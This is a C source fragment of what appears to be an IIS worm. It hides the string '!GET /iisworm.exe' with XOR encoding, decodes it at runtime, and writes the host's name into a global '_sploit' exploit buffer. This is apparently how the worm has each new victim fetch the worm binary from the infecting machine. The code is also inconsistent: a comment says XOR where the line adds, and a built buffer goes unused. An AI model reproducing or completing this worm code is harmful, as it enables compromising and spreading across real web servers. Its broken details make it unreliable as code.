#pragma optimize("", off)
#include "data_globals.h"
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}


#include <stdlib.h>
#include <string.h>

void setuphostname(void) {
    char hostname[1024];
    struct hostent *he;
    char tmp[1024];
    size_t len;
    int i;

    if (gethostname(hostname, sizeof(hostname)) != 0) return;
    he = gethostbyname(hostname);
    if (!he) return;

    strncpy(tmp, he->h_name, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';

    // "!GET /iisworm.exe" with key 0x3E
    volatile char sz_suffix[] = {
        '!'^0x3E, 'G'^0x3E, 'E'^0x3E, 'T'^0x3E, ' '^0x3E,
        '/'^0x3E, 'i'^0x3E, 'i'^0x3E, 's'^0x3E, 'w'^0x3E,
        'o'^0x3E, 'r'^0x3E, 'm'^0x3E, '.'^0x3E, 'e'^0x3E,
        'x'^0x3E, 'e'^0x3E, 0x00^0x3E
    };
    xor_decrypt(sz_suffix, sizeof(sz_suffix), 0x3E);
    strncat(tmp, (char*)sz_suffix, sizeof(tmp) - strlen(tmp) - 1);

    for (i = 0; i < (int)strlen(tmp); i++)
        tmp[i] += 0x21;   // XOR with 0x21 (add 0x21)

    len = strlen(he->h_name);
    if (len > 100) len = 100;

    // Copy into the exploit buffer at the correct offset
    memcpy(_sploit + sizeof(_sploit) - 102, he->h_name, len);
}

#pragma optimize("", on)
